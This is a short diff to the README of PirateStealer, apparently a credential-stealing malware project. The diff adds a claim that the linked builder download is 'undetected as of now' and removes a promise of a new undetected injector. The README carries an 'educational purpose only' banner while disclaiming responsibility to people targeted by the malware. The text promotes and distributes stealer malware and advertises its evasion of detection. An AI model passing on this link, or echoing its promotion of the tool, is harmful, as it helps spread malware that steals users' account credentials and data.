@@ -1,6 +1,6 @@
 #### ⚠️ Proof Of Concept && Educational Purpose Only && KingFA == Skid⚠️
 # PirateStealer 
-# Click here [Builder](https://github.com/bytixo/PirateStealer/releases/download/1.4.1/PirateStealerBuilder.zip)
+# Click here [Builder](https://github.com/bytixo/PirateStealer/releases/download/1.4.1/PirateStealerBuilder.zip) (Undected as of now)
 
 ## Read this please
 I'm not the original owner of this repository
@@ -8,8 +8,6 @@ I'm not the original owner of this repository
 As you may know stanley deleted all of his repositories since he don't want to be associated with malware developpement anymore, as you can see he transfered ownership to me but what does that mean ? 
 
 I will try to update PirateStealer, but take into account that I don't have that much free time to work on it due to college stuff bla-bla...
-
-I will post soon a new injector that is undetected.
 
 ### You were targeted by this malware
 Sorry but don't come at me since I'm not responsible of what people do with this repo
